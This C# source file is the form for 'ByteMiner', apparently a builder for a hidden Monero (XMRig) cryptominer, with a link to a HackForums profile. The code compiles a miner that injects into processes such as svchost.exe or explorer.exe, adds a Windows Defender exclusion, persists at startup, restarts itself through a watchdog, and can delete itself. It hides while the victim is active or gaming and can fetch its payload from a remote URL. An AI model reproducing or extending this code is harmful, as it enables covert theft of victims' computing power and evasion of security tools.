using System.ComponentModel;
using System.Diagnostics;
using System.IO.Compression;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using ReaLTaiizor.Controls;
using ReaLTaiizor.Forms;

namespace ByteMiner
{
    public partial class Form2 : LostForm
    {
        string minerMutex;
        StringBuilder minerCode;
        StringBuilder watchdogCode;
        StringBuilder resources;

        Util util1 = new Util();


        public Form2()
        {
            InitializeComponent();

            toolTip1.SetToolTip(this.BuildButton, "Build Miner");
            // Pool Tool Tips
            toolTip1.SetToolTip(this.UrlTextBox, "Enter the Pool URL");
            toolTip1.SetToolTip(this.Nicehashlabe, "Enter the Pool Password");
            toolTip1.SetToolTip(this.CoinComboBox1, "Select the coin you wish to mine.");
            toolTip1.SetToolTip(this.tlsSwitch, "Enable/Disable TLS");
            toolTip1.SetToolTip(this.nicehashSwitch, "Enable/Disable Nicehash mining");
            toolTip1.SetToolTip(this.AlgoCombobox, "Select the Algorithm you wish to mine.");
            toolTip1.SetToolTip(this.rigIdTextBox, "Enter the RigId for the miner");
            toolTip1.SetToolTip(this.WalletTextBox, "Enter your wallet address");

            // Stealth Tool Tips
            toolTip1.SetToolTip(this.StealthTargetsSwitch, "Enable/Disable Stealth Mining");
            toolTip1.SetToolTip(this.StealthTargetTextBox, "Enter the processes which will trigger stealth mode.");
            toolTip1.SetToolTip(this.StaticSwitch, "Embed the miner into the final executable.");
            toolTip1.SetToolTip(this.xmrigUrlTextBox, "Fetch the xmrig from remote url. (Smaller Exe)");
            toolTip1.SetToolTip(this.IdleMiningSwitch, "Enable Idle Mining");
            toolTip1.SetToolTip(this.ActiveThreadsTextBox, "% of CPU used when user is active.");
            toolTip1.SetToolTip(this.IdleThreadsTextBox, "% of CPU used when user is Idle.");
            toolTip1.SetToolTip(this.IdleTimeTextBox, "How long before idle mining is started. (in minutes)");
            toolTip1.SetToolTip(this.RemoteConfigSwitch, "Enable/Disable Remote Config");
            toolTip1.SetToolTip(this.RemoteConfigTextBox, "URL for  remote config, it must be json.");
            toolTip1.SetToolTip(this.watchDogSwitch, "Watchdog will restart miner automatically if it closes.");
            toolTip1.SetToolTip(this.FullscreeSwitch, "If user is gaming in full screen, miner will be put into stealth mode.");

            // Misc Tool Tips

            string commandGlobal;


        }

        public string GenerateRandomString(int length)
        {
            const string chars = "abcdefghijklmnopqrstuvwxyz";
            Random random = new Random();
            return new string(Enumerable.Repeat(chars, length)
              .Select(s => s[random.Next(s.Length)]).ToArray());
        }
        string minerOutputName;
        public string BuildCommandStr()
        {

            string IdleTimeInSeconds;

            if (int.TryParse(IdleTimeTextBox.Text, out int minutes) && minutes > 0)
            {
                IdleTimeInSeconds = (minutes * 60).ToString();
            }
            else
            {
                //MessageBox.Show("Please enter a valid number of minutes (greater than 0).", "Invalid Input", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                IdleTimeInSeconds = "0"; // or handle appropriately
            }

            string command = $" -o {UrlTextBox.Text.ToString()} -a {AlgoCombobox.Text.ToString()} " +
                $"-u {WalletTextBox.Text.ToString()} -p {Nicehashlabe.Text.ToString()} " +
                $"--coin {CoinComboBox1.Text.ToString()} --c-id {minerMutex} " +
                $"--rig-id {rigIdTextBox.Text.ToString()} " +
                $"--c-idle-threads {IdleThreadsTextBox.Text.ToString()} --c-active-threads {ActiveThreadsTextBox.Text.ToString()} " +
                $"--c-idle-time {IdleTimeInSeconds}";

            if (StealthTargetsSwitch.Checked)
            {
                command = command + $" --b-stealth-targets {StealthTargetTextBox.Text.ToString()}";
            }

            if (IdleMiningSwitch.Checked)
            {
                command = command + $" --c-idle-mining true";

            }
            else
            {
                command = command + $" --c-idle-mining false";
            }

            if (FullscreeSwitch.Checked)
            {
                command = command + " --c-full-screen true";
            }
            else
            {
                command = command + " --c-full-screen false";
            }


            if (nicehashSwitch.Checked)
            {
                command = command + " --nicehash";
            }

            if (tlsSwitch.Checked)
            {
                command = command + " --tls";
            }

            if (RemoteConfigSwitch.Checked)
            {
                command = command + $" --b-remote-config-url {RemoteConfigTextBox.Text.ToString()}";
            }


            return command;
        }
        public void LoadJson()
        {

            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    // Check if you really have a file name 
                    if (ofd.FileName.Trim() != string.Empty)
                    {
                        using (StreamReader r = new StreamReader(ofd.FileName))
                        {
                            string json = r.ReadToEnd();
                            Config items = JsonSerializer.Deserialize<Config>(json);

                            bool tlsParsed = bool.Parse(items.tls.ToString().ToLower());
                            tlsSwitch.Checked = tlsParsed;
                            bool nicehashParsed = bool.Parse(items.nicehash.ToString().ToLower());
                            nicehashSwitch.Checked = nicehashParsed;
                            UrlTextBox.Text = items.poolUrl.ToString();
                            PasswordTextBox.Text = items.password.ToString();
                            CoinComboBox1.Text = items.coin.ToString();
                            rigIdTextBox.Text = items.ridId.ToString();
                            AlgoCombobox.Text = (items.algo == null ? "rx/0" : items.algo.ToString());
                            WalletTextBox.Text = items.walletAddress.ToString();


                            // Load Stealth options

                            StealthTargetsSwitch.Checked = items.isStealthTargetsEnabled;
                            StealthTargetTextBox.Text = items.stealthTargets;
                            RemoteConfigSwitch.Checked = items.isRemoteConfigEnabled;
                            RemoteConfigTextBox.Text = items.remoteConfigUrl;
                            IdleMiningSwitch.Checked = items.isIdleMiningEnabled;
                            IdleThreadsTextBox.Text = items.idleThreads;
                            ActiveThreadsTextBox.Text = items.activeThreads;
                            IdleTimeTextBox.Text = items.idleWaitTime;

                            StaticSwitch.Checked = items.isBuildStatic;

                            xmrigUrlTextBox.Text = items.xmrigUrl;
                            InjectComboBox.SelectedIndex = items.injectionTarget;
                            WDExclusionSwitch.Checked = items.WDExclusion;
                            DisableSleepSwitch.Checked = items.DisableSleep;
                            RunAsAdminSwitch.Checked = items.RunAsAdmin;
                            InstallPathTextBox.Text = items.InstallPath;
                            MinerServiceTextBox.Text = items.MinerService;
                            BasePathComboBox.SelectedIndex = items.BaseInstallPath;
                            DebugSwitch.Checked = items.IsDebug;
                            watchDogSwitch.Checked = items.Watchdog;
                            FullscreeSwitch.Checked = items.fullscreen;
                        }
                    }
                }

            }

        }
        public void SaveJson()
        {
            List<Config> _data = new List<Config>();
            _data.Add(new Config()
            {
                nicehash = nicehashSwitch.Checked,
                tls = tlsSwitch.Checked,
                poolUrl = UrlTextBox.Text.ToString(),
                password = PasswordTextBox.Text.ToString(),
                coin = (CoinComboBox1.Text.ToString() == "" ? "XMR" : CoinComboBox1.Text.ToString()),
                ridId = rigIdTextBox.Text.ToString(),
                algo = (AlgoCombobox.Text.ToString() == "" ? "rx/0" : AlgoCombobox.Text.ToString()),
                walletAddress = WalletTextBox.Text.ToString(),
                isStealthTargetsEnabled = StealthTargetsSwitch.Checked,
                stealthTargets = StealthTargetTextBox.Text.ToString(),
                isRemoteConfigEnabled = RemoteConfigSwitch.Checked,
                remoteConfigUrl = RemoteConfigTextBox.Text.ToString(),
                isIdleMiningEnabled = IdleMiningSwitch.Checked,
                idleThreads = IdleThreadsTextBox.Text.ToString(),
                activeThreads = ActiveThreadsTextBox.Text.ToString(),
                idleWaitTime = IdleTimeTextBox.Text.ToString(),
                isBuildStatic = StaticSwitch.Checked,
                xmrigUrl = xmrigUrlTextBox.Text.ToString(),
                injectionTarget = InjectComboBox.SelectedIndex,
                WDExclusion = WDExclusionSwitch.Checked,
                DisableSleep = DisableSleepSwitch.Checked,
                RunAsAdmin = RunAsAdminSwitch.Checked,
                IsDebug = DebugSwitch.Checked,
                InstallPath = InstallPathTextBox.Text.ToString(),
                MinerService = MinerServiceTextBox.Text.ToString(),
                BaseInstallPath = BasePathComboBox.SelectedIndex,
                Watchdog = watchDogSwitch.Checked,
                fullscreen = FullscreeSwitch.Checked,
                SelfDelete = SelfDeleteSwitch.Checked


            });

            string json = JsonSerializer.Serialize(_data[0]);
            File.WriteAllText(@"Config.json", json);

        }

        public async void WriteMinerFiles(StringBuilder minerCode, StringBuilder watchdogCode)
        {


            minerCode.Replace("$StartUpBasePath", BasePathComboBox.Text.ToString());
            minerCode.Replace("$MonerPath", InstallPathTextBox.Text.ToString().Replace("/", $"\\\\"));
            minerCode.Replace("$MinerMutex", minerMutex);
            watchdogCode.Replace("$MinerMutex", minerMutex);



            if (DebugSwitch.Checked)
            {
                minerCode.Replace("$mainType", "int main()");
            }
            else
            {
                minerCode.Replace("$mainType", "int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,LPSTR lpCmdLine, int nCmdShow)");
            }

            if (AddToStartup.Checked)
            {
                minerCode.Replace("$ADDSTARTUP", "#define DefADDSTARTUP");
            }
            else
            {
                minerCode.Replace("$ADDSTARTUP", "");
            }

            if (SelfDeleteSwitch.Checked)
            {
                minerCode.Replace("$SelfDelete", "#define DefSelfDelete");
            }
            else
            {
                minerCode.Replace("$SelfDelete", "");
            }



            if (StaticSwitch.Checked)
            {
                minerCode.Replace("$STATIC", "#define STATIC");
                minerCode.Replace("$XmrigUrl", "");
            }
            else
            {
                minerCode.Replace("$STATIC", "");

                minerCode.Replace("$XmrigUrl", xmrigUrlTextBox.Text.ToString());
            }

            if (watchDogSwitch.Checked)
            {
                minerCode.Replace("$WATCHDOG", "#define WATCHDOG");
                watchdogCode.Replace("$StartUpBasePath", BasePathComboBox.Text.ToString());
                watchdogCode.Replace("$AppName", MinerServiceTextBox.Text.ToString());
                watchdogCode.Replace("$startupPath", InstallPathTextBox.Text.ToString().Replace("/", $"\\\\"));
                watchdogCode.Replace("$WatchdogMutex", GenerateRandomString(8));

            }
            else
            {
                minerCode.Replace("$WATCHDOG", "");
            }

            if (DisableSleepSwitch.Checked)
            {
                minerCode.Replace("$NOSLEEP", "#define NOSLEEP");
            }
            else
            {
                minerCode.Replace("$NOSLEEP", "");
            }

            if (WDExclusionSwitch.Checked)
            {
                minerCode.Replace("$WDEXCLUSION", "#define WDEXCLUSION");
            }
            else
            {
                minerCode.Replace("$WDEXCLUSION", "");
            }

            switch (InjectComboBox.SelectedIndex)
            {
                case 0:
                    minerCode.Replace("$MonerInjectionTarget", @"svchost.exe");
                    break;
                case 1:
                    minerCode.Replace("$MonerInjectionTarget", @"explorer.exe");
                    break;
                case 2:
                    minerCode.Replace("$MonerInjectionTarget", @"conhost.exe");
                    break;
                case 3:
                    minerCode.Replace("$MonerInjectionTarget", @"notepad.exe");
                    break;
                case 4:
                    minerCode.Replace("$MonerInjectionTarget", @"cmd.exe");
                    break;
                case 5:
                    minerCode.Replace("$MonerInjectionTarget", @"dwm.exe");
                    break;
                default:
                    minerCode.Replace("$MonerInjectionTarget", @"svchost.exe");
                    break;
            }


            DirectoryInfo src = Directory.CreateDirectory("src");

            File.WriteAllText("src\\watchdog.cpp", watchdogCode.ToString());

            src.Attributes = FileAttributes.Directory | FileAttributes.Hidden;


            Directory.CreateDirectory("src\\lib");
            File.WriteAllText("src\\lib\\aes.c", Properties.Resources.aes_c);
            File.WriteAllText("src\\lib\\aes.h", Properties.Resources.aes_h);
            File.WriteAllText("src\\lib\\aes.hpp", Properties.Resources.aes_hpp);
            File.WriteAllText("src\\lib\\obfuscate.h", Properties.Resources.obfuscate_h);
            File.WriteAllText("src\\lib\\lazy_importer.hpp", Properties.Resources.lazy_importer_hpp);
            File.WriteAllText("src\\lib\\httplib.h", Properties.Resources.httplib_h);
            File.WriteAllText("src\\lib\\b64.cpp", Properties.Resources.b64_cpp);
            File.WriteAllText("src\\lib\\b64.h", Properties.Resources.b64_h);


            File.WriteAllText("src\\file_util.cpp", Properties.Resources.file_util_cpp);
            File.WriteAllText("src\\file_util.h", Properties.Resources.file_util_h);
            File.WriteAllText("src\\buffer_util.cpp", Properties.Resources.buffer_util_cpp);
            File.WriteAllText("src\\buffer_util.h", Properties.Resources.buffer_util_h);
            File.WriteAllText("src\\patch_ntdll.cpp", Properties.Resources.patch_ntdll_cpp);
            File.WriteAllText("src\\patch_ntdll.h", Properties.Resources.patch_ntdll_h);
            File.WriteAllText("src\\pe_hdrs_helper.cpp", Properties.Resources.pe_hdrs_helper_cpp);
            File.WriteAllText("src\\pe_hdrs_helper.h", Properties.Resources.pe_hdrs_helper_h);

            File.WriteAllText("src\\pe_helper.cpp", Properties.Resources.pe_helper_cpp);
            File.WriteAllText("src\\pe_helper.h", Properties.Resources.pe_helper_h);
            File.WriteAllText("src\\pe_loader.cpp", Properties.Resources.pe_loader_cpp);
            File.WriteAllText("src\\pe_loader.h", Properties.Resources.pe_loader_h);
            File.WriteAllText("src\\pe_raw_to_virtual.cpp", Properties.Resources.pe_raw_to_virtual_cpp);
            File.WriteAllText("src\\pe_raw_to_virtual.h", Properties.Resources.pe_raw_to_virtual_h);

            File.WriteAllText("src\\relocate.cpp", Properties.Resources.relocate_cpp);
            File.WriteAllText("src\\relocate.h", Properties.Resources.relocate_h);

            File.WriteAllText("src\\resource.h", Properties.Resources.resource_h);
            File.WriteAllText("src\\app.manifest", Properties.Resources.app_manifest.Replace("$MANIFESTLEVEL", RunAsAdminSwitch.Checked ? "requireAdministrator" : "asInvoker"));

            File.WriteAllText("src\\manifest.rc", Properties.Resources.manifest_rc);

            File.WriteAllText("src\\run_pe.cpp", Properties.Resources.run_pe_cpp);
            File.WriteAllText("src\\run_pe.h", Properties.Resources.run_pe_h);

            File.WriteAllText("src\\tchar.h", Properties.Resources.tchar_h);
            File.WriteAllText("src\\unicode.h", Properties.Resources.unicode_h);

            File.WriteAllText("src\\common_util.cpp", Properties.Resources.common_util_cpp);
            File.WriteAllText("src\\common_util.h", Properties.Resources.common_util_h);

            File.WriteAllBytes("src\\embedded.ico", Properties.Resources.embedded);

        }

        public void BuildLog(string message)
        {
            DateTime now = DateTime.Now;
            LogTextBox.Text = LogTextBox.Text.ToString() + $"{now.ToLongTimeString()} {message} \n";
        }

        public void ClearLog()
        {
            LogTextBox.ResetText();
        }
        public async void ExtractBuildTools()
        {
            backgroundWorker1.ReportProgress(0);
            if (!Directory.Exists("portable_tools"))
            {
                Directory.CreateDirectory("portable_tools");
                ZipFile.ExtractToDirectory(new MemoryStream(Properties.Resources.portable_tools1), ".\\portable_tools");
                ZipFile.ExtractToDirectory(new MemoryStream(Properties.Resources.portable_tools2), ".\\portable_tools");
                ZipFile.ExtractToDirectory(new MemoryStream(Properties.Resources.portable_tools3), ".\\portable_tools");
            }
            backgroundWorker1.ReportProgress(100);

        }


        public void ToggleInput(bool value)
        {

            rigIdTextBox.Enabled = value;
            WalletTextBox.Enabled = value;
            CoinComboBox1.Enabled = value;
            Nicehashlabe.Enabled = value;
            nicehashSwitch.Enabled = value;
            UrlTextBox.Enabled = value;
            tlsSwitch.Enabled = value;

            StealthTargetsSwitch.Enabled = value;
            StealthTargetTextBox.Enabled = value;

            RemoteConfigSwitch.Enabled = value;
            RemoteConfigTextBox.Enabled = value;

            FullscreeSwitch.Enabled = value;
            IdleMiningSwitch.Enabled = value;
            ActiveThreadsTextBox.Enabled = value;
            IdleThreadsTextBox.Enabled = value;
            IdleTimeTextBox.Enabled = value;
            StaticSwitch.Enabled = value;
            xmrigUrlTextBox.Enabled = value;

            WDExclusionSwitch.Enabled = value;
            AddToStartup.Enabled = value;
            InjectComboBox.Enabled = value;

            BasePathComboBox.Enabled = value;
            InstallPathTextBox.Enabled = value;
            MinerServiceTextBox.Enabled = value;

            watchDogSwitch.Enabled = value;

            DebugSwitch.Enabled = value;

            DisableSleepSwitch.Enabled = value;

            RunAsAdminSwitch.Enabled = value;

            SelfDeleteSwitch.Enabled = value;

            BuildButton.Enabled = value;

        }

        private void BuildButton_Click(object sender, EventArgs e)
        {
            ClearLog();

            minerMutex = GenerateRandomString(8);
            minerCode = new StringBuilder(Properties.Resources.maincpp);
            watchdogCode = new StringBuilder(Properties.Resources.watchdog_cpp);

            resources = new StringBuilder();
            minerOutputName = GenerateRandomString(8);
            TabControl.SelectedTab = LogTab;
            ToggleInput(false);
            if (!backgroundWorker1.IsBusy)
            {
                backgroundWorker1.RunWorkerAsync();
            }
        }

        private void exportButton_Click(object sender, EventArgs e)
        {
            SaveJson();
        }

        private void importConfigButton_Click(object sender, EventArgs e)
        {
            LoadJson();
        }


        private void backgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
        {

            ExtractBuildTools();

        }


        private void backgroundWorker1_ProgressChanged(object sender, ProgressChangedEventArgs e)
        {
            if (e.ProgressPercentage == 0)
            {
                BuildLog("Extracting Build Tools...");
            }
            if (e.ProgressPercentage == 100)
            {
                BuildLog("Build Tools Extracted");
            }

        }

        public static byte[] Encrypt(byte[] plaintext, byte[] key, byte[] iv)
        {
            // Instantiate AES with the provided key and IV.
            Aes aesAlg = Aes.Create();
            aesAlg.Key = key;
            aesAlg.IV = iv;

            // Generate an encryption object using the provided key and IV
            ICryptoTransform encryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV);

            // Create a memory stream to hold the encrypted data.
            using (MemoryStream ms = new MemoryStream())
            {
                // Write plaintext into the encryption stream and pad it as necessary.
                byte[] padding = new byte[16 - plaintext.Length % 16];
                Array.Fill<byte>(padding, 0x01); // PKCS#7 padding: all bytes are set to 1 for a total of '16 - (plaintext % 16)' bytes.

                using (CryptoStream cs = new CryptoStream(ms, encryptor, CryptoStreamMode.Write))
                {
                    cs.Write(plaintext, 0, plaintext.Length);
                    cs.Write(padding, 0, padding.Length);

                    ms.Position = 0; // Reset stream position before reading the encrypted data.
                }

                // The CryptoStream automatically encrypts the data as it is written into memory stream 'ms'.
                return ms.ToArray();
            }
        }

        private void backgroundWorker1_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
        {


            string commandStr = BuildCommandStr();


            //System.Text.Encoding.UTF8.GetBytes(commandStr)
            byte[] commandStrBytes = System.Text.Encoding.UTF8.GetBytes(commandStr);

            string b64Command = System.Convert.ToBase64String(commandStrBytes);


            minerCode.Replace("$AppName", MinerServiceTextBox.Text.ToString());
            minerCode.Replace("$B64CommandStr", b64Command.ToString());
            WriteMinerFiles(minerCode, watchdogCode);

            if (!ResourceCompilerBgWorker.IsBusy)
            {
                ResourceCompilerBgWorker.RunWorkerAsync();
            }

        }


        private void ResourceCompilerBgWorker_DoWork(object sender, DoWorkEventArgs e)
        {
            ResourceCompilerBgWorker.ReportProgress(0);

            if (watchDogSwitch.Checked)
            {

                util1.CompileMiner("src/watchdog.cpp src/common_util.cpp src/lib/b64.cpp -m64 -Wl,-subsystem,windows -lstdc++ -x c++ -O2 -g0 -static-libgcc -static-libstdc++ -l ws2_32 -static -s -o watchdog.exe");

                util1.CreateResource(resources, "resWatchDog", File.ReadAllBytes("watchdog.exe"));
                File.Delete("watchdog.exe");
            }


            if (StaticSwitch.Checked)
            {
                util1.CreateResource(resources, "resEmbedded", File.ReadAllBytes("src\\embedded.ico"));
                util1.CompileResources("src\\manifest.rc src\\manifest.o");
            }

            ResourceCompilerBgWorker.ReportProgress(100);
        }

        private void ResourceCompilerBgWorker_ProgressChanged(object sender, ProgressChangedEventArgs e)
        {
            if (e.ProgressPercentage == 0)
            {
                BuildLog("Compiling Resources...");
            }
            if (e.ProgressPercentage == 15)
            {
                BuildLog("Compiling Watchdog...");
            }
            if (e.ProgressPercentage == 100)
            {

                BuildLog("Resources Compiled.");
            }
        }

        private void ResourceCompilerBgWorker_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
        {
            minerCode.Replace("$RESOURCES", resources.ToString());
            File.WriteAllText("src\\main.cpp", minerCode.ToString());

            if (!CompilerBgWorker.IsBusy)
            {
                CompilerBgWorker.RunWorkerAsync();
            }

        }

        private void CompilerBgWorker_DoWork(object sender, DoWorkEventArgs e)
        {
            CompilerBgWorker.ReportProgress(0);
            util1.CompileMiner($"src/main.cpp -m64" + (DebugSwitch.Checked ? " " : " -Wl,-subsystem,windows") + " src/patch_ntdll.cpp src/pe_hdrs_helper.cpp src/pe_helper.cpp src/pe_loader.cpp src/pe_raw_to_virtual.cpp src/relocate.cpp src/run_pe.cpp src/file_util.cpp src/buffer_util.cpp src/lib/aes.hpp src/lib/lazy_importer.hpp src/lib/aes.c src/common_util.cpp src/lib/b64.cpp src/manifest.o -lstdc++ -x c++ -O2 -g0 -static-libgcc -static-libstdc++ -l ws2_32 -static -s -o " + $"{minerOutputName}.exe");
            CompilerBgWorker.ReportProgress(100);
        }

        private void CompilerBgWorker_ProgressChanged(object sender, ProgressChangedEventArgs e)
        {

            if (e.ProgressPercentage == 0)
            {
                BuildLog("Compiling Miner...");
            }
            if (e.ProgressPercentage == 100)
            {
                BuildLog("Miner Compiled");
                BuildLog($"Miner can be found at: {Path.GetFullPath(".")}\\{minerOutputName}.exe");

            }
        }

        private void CompilerBgWorker_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
        {

            if (!CleanerBgWorker.IsBusy)
            {
                CleanerBgWorker.RunWorkerAsync();
            }

        }

        private void CleanerBgWorker_DoWork(object sender, DoWorkEventArgs e)
        {
            CleanerBgWorker.ReportProgress(0);
            //Directory.Delete("portable_tools", true);
            Directory.Delete("src", true);
            CleanerBgWorker.ReportProgress(100);
        }

        private void CleanerBgWorker_ProgressChanged(object sender, ProgressChangedEventArgs e)
        {
            if (e.ProgressPercentage == 0)
            {
                BuildLog("Cleaning up files...");
            }
            if (e.ProgressPercentage == 100)
            {
                BuildLog("Files cleaned.");
            }
        }

        private void CleanerBgWorker_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
        {
            ToggleInput(true);
        }

        private void watchdogBgWorker_DoWork(object sender, DoWorkEventArgs e)
        {

        }

        private void StaticSwitch_CheckedChanged(object sender)
        {
            if (sender is ForeverToggle checkBox)
            {
                xmrigUrlTextBox.Enabled = !checkBox.Checked;
            }
        }

        private void RemoteConfigSwitch_CheckedChanged(object sender)
        {
            if (sender is ForeverToggle checkBox)
            {
                RemoteConfigTextBox.Enabled = checkBox.Checked;
            }
        }

        private void foxLinkLabel1_Click(object sender, EventArgs e)
        {

            // Navigate to a URL.
            System.Diagnostics.Process.Start(new ProcessStartInfo
            {
                FileName = "https://hackforums.net/member.php?action=profile&uid=5620205",
                UseShellExecute = true
            });


        }

        private void foxLinkLabel2_Click(object sender, EventArgs e)
        {
            // Navigate to a URL.
            System.Diagnostics.Process.Start(new ProcessStartInfo
            {
                FileName = "https://www.github.com/ByteDoktor/SilentXMRMiner",
                UseShellExecute = true
            });
        }


    }
}